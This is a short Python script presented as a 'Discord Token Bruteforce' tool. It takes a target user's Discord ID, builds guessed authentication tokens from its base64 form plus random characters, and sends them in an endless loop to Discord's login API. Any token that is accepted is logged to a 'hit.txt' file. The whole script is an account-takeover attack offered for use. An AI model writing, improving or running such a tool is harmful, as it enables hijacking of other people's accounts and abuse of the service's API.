import base64
import os
import random
import string
import requests
from colorama import *
import urllib

os.system("cls")
os.system("title Discord Token Bruteforce By Arrgonn ## Redesign by 1YablochniK1")

banner = """
Discord Token Bruteforce

Creator: Arrgonn
Redesign: 1YablochniK1
"""

print(Fore.WHITE + Style.BRIGHT + banner)
id_orig = input(Fore.CYAN + "[" + Fore.WHITE + ">" + Fore.CYAN + "]" +  Fore.WHITE + " ID to token $: " + Fore.BLUE).encode("ascii")

id_to_token = base64.b64encode(id_orig)
id_to_token = str(id_to_token)[2:-1]

i = 0
y = 0
t = 0

print()
while id_to_token == id_to_token:
    os.system("title Discord Token Bruteforce  [Attempts: " + str(i) + "]  [Invalid: " + str(y) + "]  [Valid: " + str(t) + "]")
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }

    login = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
    
    try:
        if login.status_code == 200:
            print(Fore.CYAN + "[" + Fore.GREEN + 'VALID' + Fore.CYAN + '] ' + Fore.WHITE + token + Fore.CYAN + " :: " + Fore.WHITE + str(id_orig)[2:-1] + Fore.RESET)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
            t+=1
        else:
            y+=1
            print(Fore.CYAN + "[" + Fore.RED + 'INVALID' + Fore.CYAN + '] ' + Fore.WHITE + token + Fore.CYAN + " :: " + Fore.WHITE + str(id_orig)[2:-1] + Fore.RESET)
    finally:
        pass

    i+=1


input()

